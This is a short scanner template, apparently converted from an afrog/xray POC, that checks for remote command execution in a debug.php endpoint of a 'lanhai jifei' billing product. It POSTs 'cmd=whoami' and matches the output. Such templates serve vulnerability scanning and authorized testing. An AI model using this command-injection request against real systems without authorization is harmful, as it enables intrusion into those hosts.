# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: |
      cmd=whoami
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - toor
        condition: and
      - type: word
        part: header
        words:
          - text/html
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/debug.php?_t=0.01693626099009471'
id: lanhai-jifei-debug-rce
